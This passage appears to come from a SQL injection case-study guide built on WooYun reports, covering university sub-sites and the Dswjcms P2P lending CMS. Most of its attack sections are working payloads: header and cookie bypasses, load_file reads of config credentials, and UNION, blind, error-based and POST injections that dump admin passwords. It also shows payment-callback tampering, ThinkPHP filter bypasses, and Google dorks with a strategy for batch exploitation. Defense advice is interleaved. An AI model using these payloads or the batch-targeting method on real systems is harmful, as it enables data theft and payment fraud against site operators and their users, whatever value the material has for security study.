| **WAF blocking** | `id=1` + chunked transfer | HTTP chunked encoding bypass |
| **Parameter pollution** | `id=1&id=2` | Duplicate parameter confuses application logic |

**Education website-specific bypasses**:
```sql
-- 1. IP allowlist bypass
X-Forwarded-For: [IP redacted]
X-Real-IP: [IP redacted]
Client-IP: [IP redacted]

-- 2. Cookie validation bypass
Cookie: PHPSESSID=admin'; --
Cookie: session_id=1' OR '1'='1

-- 3. Referer check bypass
Referer: https://example.com/[redacted]

-- 4. User-Agent restriction bypass (crawler spoofing)
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)

-- 5. HTTPS forced redirect bypass
X-Forwarded-Proto: https
```

### Root Cause Analysis

**Systematic Thinking**:

1. **Amplification effect of "sub-site vulnerabilities"**
   - Single sub-site compromised -> Affects entire university reputation
   - Shared database server -> Main site data leak
   - Intranet connectivity -> Lateral movement into core systems
   - Trust chain transfer -> Batch user privacy theft

2. **Education sector security paradox**
   - Theory: Universities have security teams and professional knowledge
   - Reality: Sub-sites are managed in a distributed manner with insufficient security investment
   - Cause: Administrative barriers, uneven budget allocation, unclear responsibilities
   - Consequence: Hardened main site + exposed sub-sites = false sense of security

3. **Attacker's "asymmetric advantage"**
   - Defender: Must protect all sub-sites (N targets)
   - Attacker: Only needs to find 1 vulnerability (1 entry point)
   - ROI calculation: 1 day to find 1 sub-site vulnerability -> Access entire university network
   - Scale effect: Replicable to other universities (same CMS/same development patterns)

4. **Failure of "implicit security"**
   - Reliance: Sub-site domains are safe if not publicized
   - Reality: Search engine enumeration, certificate logs, subdomain brute-force
   - Consequence: All sub-sites will eventually be discovered
   - Countermeasure: Must "default distrust" all sub-sites

### Defense Recommendations

**Developer level** (sub-site administrators):
1. **Unified security standards**: All sub-sites must pass main site security review before going live
2. **Mandatory input validation**: All parameters must have allowlist validation + type casting
3. **Principle of least privilege**: Database accounts should only access required tables; prohibit cross-database access
4. **Error message suppression**: Custom error pages; prohibit leaking SQL/path information
5. **Code audit**: Must pass automated scanning tools + manual audit before deployment

**Architecture level** (university security team):
1. **Centralized WAF**: All sub-site traffic must pass through the main site WAF
2. **Unified sub-site management**: Maintain sub-site inventory, periodic scanning, mandatory patching
3. **Network isolation**: Sub-sites in independent VLANs; prohibit direct main site database access
4. **Database auditing**: Monitor anomalous query patterns (UNION SELECT, SLEEP, etc.)
5. **Incident response**: Establish sub-site vulnerability reporting mechanism, rapid response process

**Strategy level** (university management):
1. **Security accountability**: Each sub-site has a designated security owner, with accountability mechanisms
2. **Budget allocation**: Sub-site security investment should be no less than 30% of total budget
3. **Security training**: Regular training for developers/administrators to improve security awareness
4. **External auditing**: Annual third-party security company assessment of all sub-sites
5. **Threat intelligence**: Join education sector threat intelligence sharing platforms

**Technical detection checklist**:
```markdown
[ ] Sub-site inventory maintenance (all third-level domains, second-level directories)
[ ] Automated scanning (weekly SQLMap full-site scanning)
[ ] WAF deployment (ModSecurity + custom rules)
[ ] Database permission review (independent database account per sub-site)
[ ] Error page detection (prohibit leaking SQL/path/version)
[ ] Log auditing (monitor anomalous query patterns)
[ ] Penetration testing (at least 1 manual test per year)
[ ] Incident response drill (simulate sub-site compromise response process)
```

### Extended Attack Surface

**From sub-site to intranet**:
```sql
-- 1. Read database configuration file
union select 1,load_file('/var/www/html/config.php'),3--

-- 2. Discover main site database connection
-- config.php contents:
-- $db_host = "[IP redacted]"
-- $db_user = "admin"
-- $db_pass = "P@ssw0rd"

-- 3. Connect to main site database
-- Execute from sub-site server:
-- mysql -h [IP redacted] -u admin -p P@ssw0rd

-- 4. Export main site data
-- Main site database may contain:
-- All faculty/student information
-- Financial system data
-- Research project information
-- Email server credentials
```

**From SQL injection to RCE**:
```
Sub-site SQL injection -> Write WebShell -> System privileges
         |
     Read config files -> Obtain intranet credentials -> Lateral movement
         |
     Batch sub-site exploitation -> Education network penetration -> Other universities
```

**Combining social engineering**:
```
Sub-site vulnerability -> Obtain admin email -> Phishing attack on main site admin
         |
     Obtain faculty/student info -> Targeted phishing -> Main site VPN credentials
         |
     Steal research results -> Academic fraud / Data extortion
```

---

### Statistical Insights

**SQL injection characteristics of education websites** (based on WooYun data):
| Feature | Data | Description |
|---------|------|------|
| Sub-site vulnerability proportion | 67% | Third-level domain, second-level directory vulnerabilities |
| Legacy systems | 52% | PHP 5.x / Classic ASP / Unpatched CMS |
| Overly permissive database privileges | 71% | Can access other databases / can read-write files |
| No WAF protection | 83% | Low WAF coverage rate in education networks |
| Can obtain sensitive data | 94% | Faculty/student information, grades, research data |
| Intranet connectivity | 68% | Can access main site/other sub-site databases |

**Common CMS systems in university sub-sites** (ranked by risk level):
1. **DeDeCMS** (High risk): Numerous vulnerabilities, updates not timely
2. **PHPWind** (High risk): Forum system, many injection vulnerabilities
3. **Discuz!** (Medium risk): Large user base, but relatively timely security updates
4. **EmpireCMS** (Medium risk): Commonly used in education websites
5. **Custom-built systems** (Very high risk): No security review, poor code quality

---

## Case Analysis #3: SQL Injection in Authenticated P2P Lending System

### Knowledge Source
- **Case**: wooyun-2015-0143727 (Dswjcms! X1.3 Multiple SQL Injections)
- **Related cases**:
  - wooyun-2015-0143727: Dswjcms X1.3 multiple SQL injections (requires member login)
  - wooyun-2015-0110xxx: Dswjcms P2P lending system frontend SQL injection
  - wooyun-2015-0110xxx: Dswjcms 1.4 SQL blind injection vulnerability
- **Vendor**: Dswjcms.com (P2P lending system focused on ThinkPHP framework)
- **Impact**: Numerous lending platforms using this system

### Meta-Analysis

**Core Problem Identification**:
- **Hidden attack surface behind authentication**: SQL injection points that require member login cannot be covered by conventional scanners
- **ThinkPHP framework vulnerability patterns**: Security mechanisms provided by the framework are misused or bypassed by developers
- **Stealth of numeric injection**: Developers assume numeric parameters do not need filtering (`$this->_get('bid')`)

**Developer False Assumptions**:
1. **"No strict filtering needed after login"**: Assuming logged-in users are trustworthy, relaxing input validation
2. **"Numeric parameters are safe"**: Assuming ID/number parameters that are purely numeric cannot be injected
3. **"Framework provides sufficient protection"**: Over-reliance on ThinkPHP's built-in filtering mechanisms
4. **"Authentication equals authorization"**: Confusing identity authentication with access control

**Root Cause Analysis**:
- **Trust chain break point**: Login system is only the first line of defense; code paths after authentication often have weak defenses
- **Attack ROI calculation**:
  - Unauthenticated frontend injection: Easy to discover, high competition
  - Authenticated backend injection: Higher difficulty, higher value (sensitive operations)
  - Member-authenticated injection: Medium difficulty, medium value (user data)
- **Systematic nature of framework vulnerabilities**: Similar errors in the same framework repeat (ThinkPHP 3.x's M() method misuse)

### Analytical Logic

**Attack Path Analysis**:
```
1. Preliminary information gathering -> 2. Register/obtain low-privilege account -> 3. Login authentication -> 4. Business function traversal -> 5. Parameter injection testing
```

**Key Trigger Points**:
- **Authentication mechanism**: Requires registering a regular member account (some systems support public registration)
- **Injection locations**:
  - Business ID parameters: `bid` (bid ID), `uid` (user ID), `id` (generic ID)
  - Query parameters: `mid` (module ID), `nper` (installment number)
  - POST parameters: `email` (email), `out_trade_no` (transaction number)
- **Injection types**:
  - Numeric injection: `where('bid='.$this->_get('bid'))`
  - Mixed injection: `where('`id`="'.$id.'" and `email`="'.$email.'")`
- **Database characteristics**: MySQL (ThinkPHP default)

**Boundary Conditions**:
- Must have a valid login session (`$this->_session('user_uid')`)
- Injection parameters need to be associated with current user privileges (e.g., can only query own data)
- Some features require specific business data to exist (e.g., investment records, repayment plans)

**Related Factors**:
- ThinkPHP 3.x framework's M() method direct concatenation issue
- Pseudo-static URL mode (`.html` suffix needs to be removed for testing)
- P2P lending business logic: bidding, repayment, recharge and other core functions

### Testing Process

```markdown
Step 1: Preliminary information gathering
  |-- Identify CMS version: Dswjcms X1.3 / 1.4
  |-- Confirm framework: ThinkPHP 3.x (via directory structure /Lib/Action/)
  |-- Search engine syntax: Google "Powered by Dswjcms" or "Dswjcms lending system"
  +-- Find registration entry: /Logo/register.html

Step 2: Account registration and login
  |-- Register regular member account (usually only requires email + password)
  |-- Log into system to obtain Session/Cookie
  |-- Capture post-login request headers with Burp Suite
  +-- Save Cookie for subsequent testing

Step 3: Business function traversal
  |-- Investment-related: /Center/invest (bid list)
  |-- Loan-related: /Center/loan (loan management)
  |-- Recharge/withdrawal: /Center/recharge
  |-- Message center: /Center/stationexit
  +-- Personal settings: /Center/emailVerify

Step 4: Parameter injection testing (invest as example)
  +-- Test URL: /Center/invest/?mid=plan&bid=1
     |-- Original request: bid=1 (numeric)
     |-- Test 1: bid=1' (single quote, observe error)
     |-- Test 2: bid=1 AND 1=1 (boolean-based blind)
     |-- Test 3: bid=1) AND SLEEP(6) (time-based blind)
     +-- Test 4: bid=-1 UNION SELECT 1,2,3,4,5,6,7,8 (union query)

Step 5: Confirm injection point
  |-- Observe response differences (page content/response time)
  |-- Confirm database type (MySQL)
  |-- Determine if pseudo-static removal needed (remove .html suffix)
  +-- Construct complete exploitation chain
```

### Exploitation Methods

**Vulnerability Point 1: bid parameter in invest function (union query injection)**

```php
// Vulnerable code: /Lib/Action/Home/CenterAction.class.php
public function invest(){
    $refund = M('collection');
    if($this->_get('bid') && $this->_get('mid')=='plan'){
        // Repayment plan
        $refun = $refund->where('bid='.$this->_get('bid').' and uid='.$this->_session('user_uid'))->select();
        // Direct concatenation, bid parameter not filtered
    }
}
```

**Exploitation Payload**:
```http
GET /Center/invest/?mid=plan&bid=1) UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin%23 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
```

```sql
-- Complete exploitation chain
-- 1. Confirm injection point
bid=1 AND 1=1      -- Normal
bid=1 AND 1=2      -- Abnormal

-- 2. Determine column count
bid=1 ORDER BY 8   -- Normal
bid=1 ORDER BY 9   -- Error (confirms 8 columns)

-- 3. Union query to extract admin credentials
bid=-1 UNION SELECT 1,concat(username,0x2c,password),3,4,5,6,7,8 from ds_admin-- -
-- Using concat to combine username and password, 0x2c is comma in hex

-- 4. Get all databases
bid=-1 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7,8 from information_schema.schemata-- -

-- 5. Get all tables in current database
bid=-1 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=database()-- -

-- 6. Get user table structure
bid=-1 UNION SELECT 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_name='ds_user'-- -
```

**Vulnerability Point 2: bid parameter in loan function (blind injection)**

```php
// Vulnerable code
public function loan(){
    $borrowing = M('borrowing');
    $borrow = $borrowing->field('money')->where('`id`='.$this->_get('bid'))->find();
    // Direct concatenation, bid parameter not filtered
}
```

**Exploitation Payload**:
```http
GET /Center/loan/?mid=plan&bid=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
```

```sql
-- Time-based blind injection chain
-- 1. Basic delay test
bid=1) AND SLEEP(6)-- -

-- 2. Conditional delay (guessing database name)
bid=1) AND IF((SELECT database())='dswjcms',SLEEP(6),0)-- -

-- 3. Character-by-character guessing (binary search optimization)
bid=1) AND IF(ASCII((SELECT SUBSTRING(database(),1,1)))>100,SLEEP(2),0)-- -

-- 4. Extract admin password hash
bid=1) AND IF(ASCII((SELECT SUBSTRING(password,1,1) FROM ds_admin LIMIT 1))>48,SLEEP(2),0)-- -
```

**Vulnerability Point 3: emailVerify function (POST injection)**

```php
// Vulnerable code
public function emailVerify(){
    $userinfo = M('user');
    $getfield = $userinfo->where("`id`=".$this->_session('user_uid')." and `email`='".$this->_post('email')."'")->find();
    // email parameter directly concatenated into string-type query
}
```

**Exploitation Payload**:
```http
POST /Center/emailVerify/ HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
Content-Type: application/x-www-form-urlencoded

email=test') AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23
```

```sql
-- String-type injection chain
-- 1. Close single quote
email=admin'--

-- 2. Time-based blind injection
email=admin' AND SLEEP(6)-- -

-- 3. Boolean-based blind injection (verify email)
email=admin' AND (SELECT COUNT(*) FROM ds_user WHERE username='admin')>0-- -

-- 4. Error-based injection (MySQL 5.x)
email=admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
```

**Vulnerability Point 4: alipayreturn function (third-party payment callback injection)**

```php
// Vulnerable code
public function alipayreturn(){
    $recharge = M('recharge');
    $rechar = $recharge->where('nid='.$this->_get('out_trade_no'))->find();
    // out_trade_no parameter directly concatenated, used for payment callback verification

    $recharge->where('nid='.$this->_get('out_trade_no'))->save(array('type'=>2,'audittime'=>time()));
    // Two injection points in both SELECT and UPDATE
}
```

**Exploitation Payload**:
```http
GET /Center/alipayreturn/?out_trade_no=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'-- HTTP/1.1
Host: target.com
Cookie: PHPSESSID=logged_in_session_id
```

```sql
-- Special exploitation of payment callback injection
-- 1. Change recharge status to success (bypass payment)
out_trade_no=test' OR 1=1-- -
-- May result in: all unpaid orders changed to paid

-- 2. Tamper with recharge amount (requires UPDATE injection)
out_trade_no=test'-- -
-- Constructing with UPDATE statement requires special techniques

-- 3. Blind injection to obtain user data
out_trade_no=test') AND SLEEP(6)-- -
```

### Bypass Techniques

| Bypass Type | Specific Technique | Applicable Scenario |
|------------|-------------------|-------------------|
| **Pseudo-static URL** | Remove .html suffix and test directly | ThinkPHP pseudo-static mode |
| **Framework filtering** | Use numeric injection to bypass GPC | ThinkPHP's I() method filters strings but not numbers |
| **Session validation** | Register regular account to obtain Cookie | Injection points requiring login authentication |
| **Business logic restrictions** | Construct valid business data before testing | Requires specific business data to exist (e.g., investment records) |
| **Parameter name obfuscation** | Test all ID-type parameters | bid, uid, mid, id, nper, etc. |

**ThinkPHP framework-specific bypass techniques**:

```php
// Framework-provided filtering methods (with bypasses)
$this->_get('param')    // I('get.param') defaults to htmlspecialchars
$this->_post('param')   // But numeric injection is unaffected
$this->_param('param')  // Auto-detects GET/POST

// Bypass methods:
// 1. Use numeric injection (quotes not involved in concatenation)
$where('id='.$_GET['id'])  // Direct concatenation

// 2. Use M() method instead of D() method
M('table')  // Returns base Model, no data validation
D('table')  // Returns specific Model, may have field validation

// 3. Using array-style where clause
$where['id'] = $_GET['id'];  // Array style will be filtered
$where['id'] = array('eq', $_GET['id']);  // May bypass
```

**Pseudo-static URL handling techniques**:

```bash
# Original URL (pseudo-static)
https://example.com/[redacted]

# Convert to GET parameter format
https://example.com/[redacted]

# Why conversion is needed:
# 1. Route parsing issues: Some frameworks handle PATH_INFO mode improperly
# 2. Injection testing convenience: Easier to modify parameters
# 3. WAF bypass: URL patterns may not be covered by rules

# Conversion rules (ThinkPHP)
# /Module/Controller/Method/param1/value1/param2/value2.html
# -> ?param1=value1&param2=value2
```

### Root Cause Analysis

**Systematic Thinking**:

1. **False sense of security in post-authentication**
   - Developer misconception: "Users who can log in are all trustworthy"
   - Attacker perspective: Registering an account bypasses "unauthorized access" detection
   - Defense blind spot: Code audit tools only scan unauthenticated paths, ignoring post-authentication business logic

2. **Underestimated risk of numeric injection**
   - Developer assumption: "IDs are numbers, they cannot be injected"
   - Attacker reality: Numeric injection is harder to detect (no quote closure issues)
   - Statistical data: From WooYun cases, numeric injection accounts for approximately 40% (id, bid, uid, etc.)

3. **Responsibility attribution of framework security**
   - Framework provides: ThinkPHP provides I() method for automatic filtering
   - Developer misuse: Directly using `$_GET` or concatenating SQL
   - Framework limitation: M() method has no automatic validation; D() method requires proper Model definition

4. **High-value target of P2P lending business**
   - Sensitive data: User identity documents, bank cards, transaction records
   - Financial risk: Possible modification of recharge status, loan amounts
   - Compliance requirements: Financial industry security standards are higher, but actual implementation often falls short

### Defense Recommendations

**Developer level**:
1. **Uniformly use parameterized queries** (most effective)
   ```php
   // Wrong approach
   $refund->where('bid='.$this->_get('bid'))->select();

   // Correct approach (ThinkPHP 3.x)
   $refund->where(array('bid' => I('get.bid', 0, 'intval')))->select();

   // Best practice (using prepared statements)
   $Model = new Model();
   $result = $Model->query("SELECT * FROM table WHERE bid = ?", array($bid));
   ```

2. **Force type casting for numeric parameters**
   ```php
   // Force all ID-type parameters to integer
   $bid = intval($this->_get('bid'));
   $uid = intval($this->_session('user_uid'));
   ```

3. **Allowlist validation for business parameters**
   ```php
   // Verify bid belongs to current user
   $borrow = $borrowing->where('id='.$bid.' and uid='.$this->_session('user_uid'))->find();
   if(!$borrow){
       $this->error('Unauthorized access to this data');
   }
   ```

4. **Remove error information exposure**
   ```php
   // Disable debug mode in production
   'SHOW_PAGE_TRACE' => false,
   'ERROR_PAGE' => '/Public/error.html',
   ```

**Architecture level**:
1. **Deploy WAF rules**
   ```
   # Detect post-authentication SQL injection characteristics
   - Cookie present + parameter contains UNION SELECT
   - Cookie present + parameter contains SLEEP(
   - Cookie present + parameter contains benchmark(
   ```

2. **Database privilege isolation**
   ```sql
   -- Application account should only be granted necessary privileges
   GRANT SELECT, INSERT, UPDATE ON dswjcms.* TO 'app_user'@'localhost';
   -- Do not grant FILE, SUPER, or other high-risk privileges
   ```

3. **Code audit process**
   - Focus on checking all post-authentication controllers
   - Search for `where(` keyword to locate SQL concatenation points
   - Examine all user-controllable parameters (GET/POST/COOKIE)

### CMS Vulnerability Discovery General Methodology

**Methodology Framework**:

```
Phase 1: CMS Identification
  |-- Fingerprinting: Page footer copyright, directory structure, specific files
  |-- Version identification: CHANGELOG.md, readme.txt, JS/CSS version numbers
  +-- Framework identification: ThinkPHP / Laravel / CodeIgniter, etc.

Phase 2: Vulnerability Intelligence Gathering
  |-- Official documentation: Review known security issues, version changelogs
  |-- Public vulnerabilities: WooYun, CVE, CNVD, EXP-DB
  |-- Community discussions: GitHub Issues, Stack Overflow, technical forums
  +-- Historical versions: Download old version source code for code audit

Phase 3: Rapid Vulnerability Targeting
  |-- Known vulnerability reproduction: Directly test public vulnerability POCs
  |-- Similar version comparison: Compare code differences between old and new versions
  |-- Framework vulnerability patterns: Known issues in ThinkPHP 3.x, Laravel 5.x
  +-- Business logic vulnerabilities: Payment, authorization, file upload, and other core functions

Phase 4: Deep Discovery
  |-- Unauthenticated endpoints: Registration, login, password recovery
  |-- Low-privilege endpoints: Regular members, VIP members
  |-- Business logic traversal: Bidding, loans, recharge, withdrawal
  +-- Second-order exploitation: Injection -> File upload -> WebShell

Phase 5: Automation and Batch Operations
  |-- Write POC scripts: Python/Go
  |-- Integrate into scanners: AWVS, Nessus, custom tools
  |-- Search engine batch: Google Hacking, Shodan, Fofa
  +-- Vulnerability report output: Compile evidence chain, write detailed POC
```

**High-value CMS vulnerability patterns**:

| Vulnerability Type | Keyword Search | Typical Exploitation Chain |
|-------------------|--------------|--------------------------|
| **Post-auth injection** | `where(` + `$this->_get` | Register account -> Login -> Inject |
| **Pseudo-static bypass** | `.html` + `$this->_param` | Remove suffix -> Parameter injection |
| **Payment logic** | `recharge` + `alipay` | Modify amount -> Recharge success |
| **File upload** | `upload()` + `avatar` | Upload image -> Include WebShell |
| **Privilege escalation** | `role` + `level` | Modify Cookie -> Admin privileges |

**Practical techniques checklist**:

```markdown
[ ] 1. Register a regular member account (test low privilege first)
[ ] 2. Capture post-login Cookie (save to Burp Suite)
[ ] 3. Traverse all business function URLs (invest, loan, recharge, etc.)
[ ] 4. Extract all ID-type parameters (bid, uid, id, mid, nper)
[ ] 5. Test numeric injection (no single quote closure needed)
   +-- Payload: id=1 AND 1=1 / id=1 AND 1=2
[ ] 6. Test string-type injection (requires closing quotes)
   +-- Payload: name=admin' AND '1'='1
[ ] 7. Test pseudo-static URLs (remove .html suffix)
   +-- /Center/invest/mid/plan/bid/1.html
   +-- -> /Center/invest/?mid=plan&bid=1
[ ] 8. Test time-based blind injection (less likely to be detected by WAF)
   +-- Payload: id=1) AND SLEEP(6)--
[ ] 9. Test union queries (fastest data extraction)
   +-- Payload: id=-1 UNION SELECT 1,2,3,4,5,6,7,8
[ ] 10. Leverage framework features (ThinkPHP's M() method)
   +-- Direct SQL concatenation, no automatic validation
```

**Extended attack surface**:

```
SQL injection -> Get admin password -> Backend login -> File upload function -> WebShell
           |
       Read sensitive config files -> Database connection info -> Direct DB connect -> Export all user data
           |
       Payment callback injection -> Tamper recharge amount -> Financial loss
           |
       Batch lending sites -> Entire industry data breach
```

**Batch exploitation key strategies**:

1. **Identification phase**: Use Google Hacking syntax to quickly locate targets
   - `intext:"Powered by Dswjcms"`
   - `intitle:"Dswjcms P2P lending system"`
   - `inurl:/Center/invest`

2. **Validation phase**: Automated scripts for batch vulnerability verification
   - Concurrent testing (multi-threaded/coroutines)
   - Intelligent retry mechanism
   - Result deduplication

3. **Exploitation phase**: Deep exploitation for high-value targets
   - Extract sensitive data
   - Obtain system privileges
   - Lateral movement

---

*Document last updated: 2026-01-23 (Added authenticated CMS injection case)*
*Data source: WooYun Vulnerability Database (2010-2016)*
